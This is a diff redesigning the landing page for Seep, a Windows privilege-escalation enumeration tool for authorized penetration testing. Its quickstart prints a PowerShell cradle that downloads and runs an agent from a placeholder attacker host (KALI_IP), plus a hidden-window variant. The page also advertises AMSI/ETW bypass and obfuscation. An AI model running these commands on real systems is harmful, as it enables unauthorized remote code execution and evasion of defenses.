@@ -1,339 +1,343 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Seep — Windows Privilege Escalation Enumeration</title>
-    <meta name="description" content="Windows privilege escalation enumeration framework with fileless agent. 16 checks, 97 tools, MITRE ATT&CK mapping with single-file HTML reports.">
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext x='16' y='24' text-anchor='middle' font-family='Inter,sans-serif' font-size='24' font-weight='800' fill='%2394e2d5'%3ES%3C/text%3E%3C/svg%3E">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        :root {
-            --accent: #94e2d5;
-            --accent-rgb: 148, 226, 213;
-            --text: #cdd6f4;
-            --sub1: #bac2de;
-            --sub0: #a6adc8;
-            --overlay2: #9399b2;
-            --overlay1: #7f849c;
-            --overlay0: #6c7086;
-            --surface2: #585b70;
-            --surface1: #45475a;
-            --surface0: #313244;
-            --base: #1e1e2e;
-            --mantle: #181825;
-            --crust: #11111b;
-        }
-        body { font-family: 'Inter', system-ui, sans-serif; background: var(--base); color: var(--text); line-height: 1.6; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Seep / Windows privesc enumeration</title>
+<meta name="description" content="Windows privilege escalation enumeration framework with fileless agent. 16 checks, 97 tools, MITRE ATT&CK mapping with single-file HTML reports.">
+<meta property="og:title" content="Seep — Windows privesc enumeration">
+<meta property="og:description" content="16 checks · 97 tools · MITRE ATT&CK · fileless agent · AMSI/ETW bypass · AES-256 upload · HTML reports">
+<meta property="og:image" content="https://raw.githubusercontent.com/Real-Fruit-Snacks/Seep/main/docs/assets/social-preview.png">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%231e1e2e'/%3E%3Ctext x='16' y='23' text-anchor='middle' font-family='Inter,sans-serif' font-size='20' font-weight='800' fill='%23cdd6f4'%3ES%3Ctspan fill='%2394e2d5'%3E.%3C/tspan%3E%3C/text%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --base:#1e1e2e;--mantle:#181825;--crust:#11111b;
+  --sf0:#313244;--sf1:#45475a;--sf2:#585b70;
+  --ov0:#6c7086;--ov1:#7f849c;--ov2:#9399b2;
+  --sub0:#a6adc8;--sub1:#bac2de;--text:#cdd6f4;
+  --mauve:#cba6f7;--lav:#b4befe;--blue:#89b4fa;--sky:#89dceb;
+  --teal:#94e2d5;--green:#a6e3a1;--yellow:#f9e2af;--peach:#fab387;--red:#f38ba8;
+  --accent:#94e2d5; /* Seep's teal */
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--crust);color:var(--text);
+  font-family:'Inter',system-ui,-apple-system,sans-serif;
+  font-size:15px;line-height:1.5;
+}
+::selection{background:var(--accent);color:var(--crust)}
+a{color:inherit;text-decoration:none}
+.mono{font-family:'JetBrains Mono','SF Mono',monospace}
 
-        /* Status Bar */
-        .status-bar {
-            background: var(--crust);
-            border-bottom: 1px solid var(--surface0);
-            padding: 8px 0;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 11px;
-            font-weight: 500;
-        }
-        .status-inner {
-            max-width: 1140px;
-            margin: 0 auto;
-            padding: 0 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .status-left { color: var(--accent); }
-        .status-right { color: var(--overlay1); }
+/* ─── Top status bar ─────────────────────────────── */
+.status{
+  background:var(--crust);border-bottom:1px solid var(--text);
+  padding:10px 24px;display:flex;justify-content:space-between;
+  font-family:'JetBrains Mono','SF Mono',monospace;font-size:11px;
+  letter-spacing:0.1em;text-transform:uppercase;color:var(--ov2);
+  position:sticky;top:0;z-index:10;
+}
+.status .left{display:flex;gap:24px;flex-wrap:wrap}
+.status .right{display:flex;gap:16px;flex-wrap:wrap}
+.status b{color:var(--accent);font-weight:700}
+.status .dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--green);margin-right:6px;vertical-align:middle}
+.status a{color:var(--ov2);transition:color .15s}
+.status a:hover{color:var(--text)}
 
-        /* Hero Section */
-        .hero {
-            background: var(--mantle);
-            border-bottom: 1px solid var(--surface0);
-            padding: 60px 0;
-        }
-        .hero-inner {
-            max-width: 1140px;
-            margin: 0 auto;
-            padding: 0 20px;
-            display: grid;
-            grid-template-columns: 1fr auto;
-            gap: 60px;
-            align-items: center;
-        }
-        .hero-content h1 {
-            font-size: clamp(48px, 8vw, 72px);
-            font-weight: 800;
-            line-height: 0.9;
-            margin-bottom: 16px;
-            color: var(--text);
-        }
-        .hero-content .accent { color: var(--accent); }
-        .hero-content p {
-            font-size: 16px;
-            color: var(--overlay1);
-            margin-bottom: 24px;
-            max-width: 480px;
-        }
-        .hero-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: var(--accent);
-            color: var(--base);
-            padding: 12px 20px;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 14px;
-            border-radius: 6px;
-            transition: transform 0.2s ease;
-        }
-        .hero-link:hover { transform: translateY(-1px); }
+/* ─── Hero ─────────────────────────────────────── */
+.hero{
+  border-bottom:1px solid var(--text);
+  padding:64px 24px 0;
+}
+.hero-inner{max-width:1280px;margin:0 auto}
+.hero .pop{
+  font-family:'JetBrains Mono','SF Mono',monospace;
+  font-size:12px;font-weight:500;color:var(--ov1);
+  letter-spacing:0.1em;text-transform:uppercase;
+  display:block;margin-bottom:24px;
+}
+.hero h1{
+  font-family:'Inter',sans-serif;
+  font-size:clamp(72px,14vw,200px);
+  line-height:0.85;font-weight:800;
+  letter-spacing:-0.05em;color:var(--text);
+  margin-bottom:32px;
+}
+.hero h1 .dot{color:var(--accent)}
+.hero-grid{
+  display:grid;grid-template-columns:1fr 1fr 1fr 1fr;
+  gap:0;border-top:1px solid var(--sf1);
+}
+.hero-grid > div{padding:20px 24px;border-right:1px solid var(--sf1)}
+.hero-grid > div:last-child{border-right:none}
+.hero-grid .label{
+  font-family:'JetBrains Mono','SF Mono',monospace;
+  font-size:10px;color:var(--ov0);
+  letter-spacing:0.18em;text-transform:uppercase;margin-bottom:8px;
+}
+.hero-grid .value{
+  font-family:'Inter',sans-serif;
+  font-size:28px;font-weight:700;color:var(--text);
+  letter-spacing:-0.02em;
+}
+.hero-grid .value .unit{color:var(--accent);font-size:0.55em;font-weight:600;margin-left:2px}
 
-        /* Specs Grid */
-        .specs-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 1px;
-            background: var(--surface0);
-        }
-        .spec-item {
-            background: var(--mantle);
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-        }
-        .spec-label {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 10px;
-            font-weight: 600;
-            text-transform: uppercase;
-            color: var(--overlay1);
-            letter-spacing: 1px;
-        }
-        .spec-value {
-            font-size: 14px;
-            font-weight: 700;
-            color: var(--accent);
-        }
-        .spec-desc {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 9px;
-            color: var(--overlay0);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
+/* ─── Modular grid layout ─────────────────────── */
+.grid{
+  display:grid;grid-template-columns:1fr 1fr;
+  border-bottom:1px solid var(--sf1);
+}
+.cell{
+  padding:48px 32px;border-right:1px solid var(--sf1);position:relative;
+}
+.cell:last-child{border-right:none}
+.cell.full{grid-column:1/-1;border-right:none}
+.cell-header{
+  display:flex;justify-content:space-between;align-items:center;
+  margin-bottom:24px;padding-bottom:14px;
+  border-bottom:1px dashed var(--sf1);
+}
+.cell-num{
+  font-family:'JetBrains Mono','SF Mono',monospace;font-size:11px;
+  color:var(--accent);letter-spacing:0.15em;font-weight:700;
+}
+.cell-name{
+  font-family:'Inter',sans-serif;font-size:13px;color:var(--ov2);
+  letter-spacing:0.2em;text-transform:uppercase;font-weight:500;
+}
+.cell h2{
+  font-size:36px;line-height:1.05;font-weight:700;
+  letter-spacing:-0.025em;margin-bottom:16px;
+}
+.cell h2 mark{background:var(--accent);color:var(--crust);padding:0 6px;font-style:normal}
+.cell p{color:var(--sub0);font-size:16px;line-height:1.65;margin-bottom:14px}
+.cell p strong{color:var(--text);font-weight:600}
+.cell p code{
+  font-family:'JetBrains Mono','SF Mono',monospace;font-size:13px;
+  background:var(--mantle);padding:2px 7px;border-radius:3px;color:var(--green);
+}
 
-        /* Main Content */
-        .main-content {
-            max-width: 1140px;
-            margin: 0 auto;
-            padding: 60px 20px;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 40px;
-        }
-        .section {
-            background: var(--mantle);
-            border: 1px solid var(--surface0);
-            padding: 32px;
-            position: relative;
-        }
-        .section-number {
-            position: absolute;
-            top: -1px;
-            left: -1px;
-            background: var(--accent);
-            color: var(--base);
-            padding: 8px 12px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 12px;
-            font-weight: 700;
-        }
-        .section h2 {
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 12px;
-            color: var(--text);
-        }
-        .section p {
-            font-size: 14px;
-            color: var(--overlay1);
-            line-height: 1.6;
-        }
+/* Spec table — KEY → VALUE */
+.feat{
+  display:grid;grid-template-columns:auto 1fr;
+  gap:18px 24px;margin-top:24px;
+  font-family:'JetBrains Mono','SF Mono',monospace;font-size:13px;
+}
+.feat .k{color:var(--accent);font-weight:700;letter-spacing:0.05em}
+.feat .v{color:var(--sub1);line-height:1.65}
+.feat .v b{color:var(--text);font-weight:600}
 
-        /* Call to Action */
-        .cta {
-            background: var(--accent);
-            color: var(--base);
-            text-align: center;
-            padding: 40px 20px;
-        }
-        .cta h2 {
-            font-size: 24px;
-            font-weight: 800;
-            margin-bottom: 8px;
-        }
-        .cta p {
-            font-size: 14px;
-            margin-bottom: 20px;
-            opacity: 0.8;
-        }
-        .cta-button {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: var(--base);
-            color: var(--accent);
-            padding: 12px 24px;
-            text-decoration: none;
-            font-weight: 700;
-            border-radius: 6px;
-            transition: transform 0.2s ease;
-        }
-        .cta-button:hover { transform: translateY(-1px); }
+/* Code block */
+pre.code{
+  background:var(--mantle);border:1px solid var(--text);
+  border-left:6px solid var(--accent);padding:20px 24px;
+  font-family:'JetBrains Mono','SF Mono',monospace;
+  font-size:13px;line-height:1.85;color:var(--sub1);
+  overflow-x:auto;margin-top:20px;
+}
+pre.code .c{color:var(--ov0)}
+pre.code .k{color:var(--mauve);font-weight:500}
+pre.code .s{color:var(--green)}
+pre.code .p{color:var(--peach)}
+pre.code .v{color:var(--blue)}
 
-        /* Footer */
-        .footer {
-            background: var(--crust);
-            border-top: 1px solid var(--surface0);
-            padding: 20px 0;
-            text-align: center;
-        }
-        .footer p {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 11px;
-            color: var(--overlay0);
-        }
-        .footer a {
-            color: var(--accent);
-            text-decoration: none;
-        }
-        .footer a:hover { text-decoration: underline; }
+/* Big call to action band */
+.band{
+  background:var(--text);color:var(--crust);
+  padding:48px 32px;border-bottom:1px solid var(--text);
+  display:grid;grid-template-columns:auto 1fr auto;align-items:center;gap:32px;
+}
+.band-tag{
+  font-family:'JetBrains Mono','SF Mono',monospace;font-size:11px;
+  letter-spacing:0.2em;text-transform:uppercase;font-weight:600;
+}
+.band h3{
+  font-family:'Inter',sans-serif;font-weight:700;
+  font-size:32px;line-height:1.1;letter-spacing:-0.02em;
+}
+.band a.cta{
+  background:var(--crust);color:var(--text);
+  padding:16px 28px;font-family:'JetBrains Mono','SF Mono',monospace;
+  font-size:13px;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;
+  border:1px solid var(--crust);transition:all 0.15s;white-space:nowrap;
+}
+.band a.cta:hover{background:var(--accent);color:var(--crust);border-color:var(--accent)}
 
-        /* Responsive */
-        @media (max-width: 768px) {
-            .hero-inner {
-                grid-template-columns: 1fr;
-                gap: 40px;
-                text-align: center;
-            }
-            .specs-grid {
-                grid-template-columns: 1fr;
-            }
-            .main-content {
-                grid-template-columns: 1fr;
-                gap: 30px;
-            }
-        }
-    </style>
+/* Footer */
+footer{
+  padding:32px 24px;display:flex;justify-content:space-between;
+  font-family:'JetBrains Mono','SF Mono',monospace;font-size:11px;
+  color:var(--ov0);letter-spacing:0.1em;text-transform:uppercase;flex-wrap:wrap;gap:16px;
+}
+footer a{color:var(--ov2);border-bottom:1px solid var(--sf0);transition:all .15s}
+footer a:hover{color:var(--text);border-bottom-color:var(--text)}
+
+@media (max-width:760px){
+  .hero h1{font-size:72px}
+  .hero-grid{grid-template-columns:1fr 1fr}
+  .grid{grid-template-columns:1fr}
+  .cell{border-right:none;border-bottom:1px solid var(--sf1)}
+  .cell:last-child{border-bottom:none}
+  .band{grid-template-columns:1fr;text-align:left}
+  .status{font-size:10px;padding:10px 14px}
+  .status .left,.status .right{gap:14px}
+}
+</style>
 </head>
 <body>
-    <!-- Status Bar -->
-    <div class="status-bar">
-        <div class="status-inner">
-            <div class="status-left">RFS ⋅ SEEP ⋅ ENUMERATION FRAMEWORK</div>
-            <div class="status-right">PYTHON ⋅ POWERSHELL</div>
-        </div>
+
+<div class="status">
+  <div class="left">
+    <span><b>SEEP</b></span>
+    <span><span class="dot"></span>ENUMERATION FRAMEWORK</span>
+    <span>PYTHON 3.9+</span>
+  </div>
+  <div class="right">
+    <a href="https://github.com/Real-Fruit-Snacks/Seep">REPO</a>
+    <a href="https://github.com/Real-Fruit-Snacks/Seep/security/advisories">SECURITY</a>
+    <a href="https://github.com/Real-Fruit-Snacks/Seep/blob/main/LICENSE">MIT</a>
+  </div>
+</div>
+
+<section class="hero">
+  <div class="hero-inner">
+    <span class="pop">Real-Fruit-Snacks &nbsp;//&nbsp; Windows privesc enumeration &nbsp;//&nbsp; 16 checks</span>
+    <h1>SEEP<span class="dot">.</span></h1>
+    <div class="hero-grid">
+      <div>
+        <div class="label">checks</div>
+        <div class="value">16<span class="unit"> modules</span></div>
+      </div>
+      <div>
+        <div class="label">tools</div>
+        <div class="value">97<span class="unit"> catalog</span></div>
+      </div>
+      <div>
+        <div class="label">agent</div>
+        <div class="value">Fileless<span class="unit"> · AES-256</span></div>
+      </div>
+      <div>
+        <div class="label">mapping</div>
+        <div class="value">ATT&CK<span class="unit"> MITRE</span></div>
+      </div>
     </div>
+  </div>
+</section>
 
-    <!-- Hero Section -->
-    <section class="hero">
-        <div class="hero-inner">
-            <div class="hero-content">
-                <h1>SEEP<span class="accent">.</span></h1>
-                <p>Windows privilege escalation enumeration framework with fileless agent. 16 checks, 97 tools, MITRE ATT&CK mapping.</p>
-                <a href="https://github.com/Real-Fruit-Snacks/Seep" class="hero-link">
-                    <span>→</span>
-                    View on GitHub
-                </a>
-            </div>
-            <div class="specs-grid">
-                <div class="spec-item">
-                    <div class="spec-label">Enumeration</div>
-                    <div class="spec-value">16 Checks</div>
-                    <div class="spec-desc">System · Privs · Registry</div>
-                </div>
-                <div class="spec-item">
-                    <div class="spec-label">Tools</div>
-                    <div class="spec-value">97 Catalog</div>
-                    <div class="spec-desc">SHA256 · MITRE ATT&CK</div>
-                </div>
-                <div class="spec-item">
-                    <div class="spec-label">Agent</div>
-                    <div class="spec-value">Fileless</div>
-                    <div class="spec-desc">AMSI · ETW · AES-256</div>
-                </div>
-                <div class="spec-item">
-                    <div class="spec-label">Reports</div>
-                    <div class="spec-value">HTML</div>
-                    <div class="spec-desc">Single-file · Dark</div>
-                </div>
-            </div>
-        </div>
-    </section>
+<div class="grid">
+  <div class="cell">
+    <div class="cell-header">
+      <span class="cell-num">01</span>
+      <span class="cell-name">Premise</span>
+    </div>
+    <h2>Windows privilege escalation <mark>enumeration framework</mark> with comprehensive discovery.</h2>
+    <p>Deploy a fileless PowerShell agent that executes 16 modular checks across system configuration, user privileges, services, patches, and registry analysis. Framework orchestrates enumeration through a Python CLI with 97 tools across 7 categories.</p>
+    <p>Agent runs entirely in memory with <strong>AMSI/ETW bypasses</strong>, AES-256 encrypted uploads, and zero disk footprint. Generate single-file HTML reports with MITRE ATT&CK mappings and actionable exploitation guidance.</p>
+  </div>
 
-    <!-- Main Content -->
-    <main class="main-content">
-        <section class="section">
-            <div class="section-number">01</div>
-            <h2>Premise</h2>
-            <p>Windows privilege escalation enumeration framework designed for comprehensive discovery of misconfigurations and vulnerabilities. Deploy a fileless PowerShell agent that executes modular checks across system configuration, user privileges, services, patches, and registry analysis.</p>
-        </section>
+  <div class="cell">
+    <div class="cell-header">
+      <span class="cell-num">02</span>
+      <span class="cell-name">Specs</span>
+    </div>
+    <h2>What's in the framework.</h2>
+    <div class="feat">
+      <div class="k">CHECKS</div><div class="v"><b>16 module categories</b> — system info, privileges, network, patches, quick wins, registry secrets.</div>
+      <div class="k">TOOLS</div><div class="v"><b>97-tool catalog</b> across 7 categories with SHA256 verification and self-hosted distribution.</div>
+      <div class="k">AGENT</div><div class="v">Fileless PowerShell execution with <b>AMSI/ETW bypass</b>, obfuscation, stealth options.</div>
+      <div class="k">CRYPTO</div><div class="v"><b>AES-256-CBC encryption</b> with GZip compression for result uploads.</div>
+      <div class="k">REPORTS</div><div class="v">Single-file HTML with <b>dark theme</b>, no CDN dependencies, executive summaries.</div>
+      <div class="k">STACK</div><div class="v">Python CLI orchestration · PowerShell agent · JSON/ZIP uploads · offline analysis.</div>
+    </div>
+  </div>
+</div>
 
-        <section class="section">
-            <div class="section-number">02</div>
-            <h2>Framework</h2>
-            <p>Python CLI orchestrates enumeration through agent composition, tool serving, and report generation. 97-tool catalog across 7 categories with SHA256 verification. Agent runs entirely in memory with AMSI/ETW bypasses and AES-256 encrypted uploads.</p>
-        </section>
+<div class="grid">
+  <div class="cell full">
+    <div class="cell-header">
+      <span class="cell-num">03</span>
+      <span class="cell-name">Quickstart</span>
+    </div>
+    <h2>Initialize, serve, execute.</h2>
+    <p>Framework deployment: Python CLI → agent composition → encrypted result upload with MITRE ATT&CK analysis.</p>
+<pre class="code"><span class="c"># Install framework (Python 3.9+ required)</span>
+$ <span class="k">pipx install</span> git+https://github.com/Real-Fruit-Snacks/Seep.git
 
-        <section class="section">
-            <div class="section-number">03</div>
-            <h2>Execution</h2>
-            <p>Fileless PowerShell agent with 16 modular checks producing structured JSON findings. MITRE ATT&CK mappings with actionable exploitation guidance. Obfuscated identifiers and stealth execution options for operational security.</p>
-        </section>
+<span class="c"># Initialize workspace and serve agent delivery</span>
+$ <span class="k">seep init</span> --workdir /tmp/op1
+$ <span class="k">seep serve</span> --workdir /tmp/op1
 
-        <section class="section">
-            <div class="section-number">04</div>
-            <h2>Reporting</h2>
-            <p>Single-file HTML reports with dark theme and no CDN dependencies. Executive summaries, per-finding detail with evidence, remediation guidance, and recommended tools. Export to HTML, Markdown, or JSON formats.</p>
-        </section>
+<span class="c"># Execute fileless agent on target (server provides token)</span>
+$ <span class="k">powershell</span> -ep bypass -c <span class="s">"IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"</span>
 
-        <section class="section">
-            <div class="section-number">05</div>
-            <h2>Architecture</h2>
-            <p>Three-layer design with Python CLI orchestration, PowerShell agent composition, and encrypted result upload. Tool categories include Enumeration, Credentials, TokenAbuse, AD, Tunneling, Impacket, and Shells with integrity verification.</p>
-        </section>
+<span class="c"># Generate single-file HTML report with ATT&CK mapping</span>
+$ <span class="k">seep report</span> /tmp/op1/results/results_*.json --format html --output report.html</pre>
+  </div>
+</div>
 
-        <section class="section">
-            <div class="section-number">06</div>
-            <h2>Authorization</h2>
-            <p>Designed for authorized Windows security testing with explicit written permission. Generates significant network traffic and PowerShell activity logged by Windows Event Log and monitoring solutions. Report vulnerabilities via GitHub Security Advisories.</p>
-        </section>
-    </main>
+<div class="grid">
+  <div class="cell">
+    <div class="cell-header">
+      <span class="cell-num">04</span>
+      <span class="cell-name">Framework</span>
+    </div>
+    <h2>Three-layer architecture.</h2>
+    <p>Python CLI orchestrates agent composition and tool serving. PowerShell agent executes modular checks with OPSEC protections. Results encrypted and uploaded for offline analysis with MITRE ATT&CK mapping.</p>
+<pre class="code"><span class="c">server/</span>
+cli.py              <span class="c"># Click CLI dispatch</span>
+agent/checks/       <span class="c"># 16 PowerShell modules</span>
+catalog/tools.yaml  <span class="c"># 97 tool definitions</span>
+http/serve.py       <span class="c"># Agent delivery + uploads</span>
+report/generator.py <span class="c"># HTML/Markdown/JSON</span></pre>
+  </div>
 
-    <!-- Call to Action -->
-    <section class="cta">
-        <h2>Start Enumerating</h2>
-        <p>Deploy fileless agents and discover privilege escalation paths</p>
-        <a href="https://github.com/Real-Fruit-Snacks/Seep" class="cta-button">
-            <span>→</span>
-            Get Seep
-        </a>
-    </section>
+  <div class="cell">
+    <div class="cell-header">
+      <span class="cell-num">05</span>
+      <span class="cell-name">Operations</span>
+    </div>
+    <h2>Agent composition and deployment.</h2>
+    <p>Compose custom agents with cherry-picked checks. Apply obfuscation with CSPRNG identifier randomization. Deploy via IEX cradle with token authentication and encrypted uploads.</p>
+    <div class="feat">
+      <div class="k">COMPOSE</div><div class="v"><code>seep compose --checks system_info,privileges</code></div>
+      <div class="k">OBFUSCATE</div><div class="v"><code>seep compose --obfuscate --output agent.ps1</code></div>
+      <div class="k">STEALTH</div><div class="v"><code>powershell -NoP -W Hidden -c "IEX(...)"</code></div>
+      <div class="k">CATALOG</div><div class="v"><code>seep catalog download --all --verify</code></div>
+    </div>
+  </div>
+</div>
 
-    <!-- Footer -->
-    <footer class="footer">
-        <p>
-            <strong>Real-Fruit-Snacks</strong> —
-            <a href="https://real-fruit-snacks.github.io/">All projects</a> ·
-            <a href="https://github.com/Real-Fruit-Snacks/Seep/security/advisories">Security</a> ·
-            <a href="https://github.com/Real-Fruit-Snacks/Seep/blob/main/LICENSE">License</a>
-        </p>
-    </footer>
+<div class="grid">
+  <div class="cell">
+    <div class="cell-header">
+      <span class="cell-num">06</span>
+      <span class="cell-name">Authorization</span>
+    </div>
+    <h2>Authorized Windows security testing only.</h2>
+    <p>Framework designed for explicit written permission engagements. Generates significant PowerShell activity logged by Windows Event Log and monitoring solutions.</p>
+    <p>Report vulnerabilities via <a href="https://github.com/Real-Fruit-Snacks/Seep/security/advisories" style="color:var(--accent);border-bottom:1px solid currentColor">private security advisories</a>, never public issues. Framework includes <strong>no</strong> exploitation capability and does not maintain persistent access.</p>
+    <p style="color:var(--ov1);font-size:14px;font-style:italic">Tool generates 16 enumeration checks with 97-tool catalog — analysis only, no system modification or credential harvesting.</p>
+  </div>
+</div>
+
+<div class="band">
+  <div class="band-tag">→ START HERE</div>
+  <h3>Windows privilege escalation<br>enumeration made systematic.</h3>
+  <a class="cta" href="https://github.com/Real-Fruit-Snacks/Seep">Open repo</a>
+</div>
+
+<footer>
+  <span>© 2026 Real-Fruit-Snacks · MIT</span>
+  <span>
+    <a href="https://real-fruit-snacks.github.io/">all 50 projects</a> &nbsp;·&nbsp;
+    <a href="https://github.com/Real-Fruit-Snacks/Seep">github</a> &nbsp;·&nbsp;
+    <a href="https://github.com/Real-Fruit-Snacks/Seep/security/advisories">security</a>
+  </span>
+</footer>
+
 </body>
 </html>
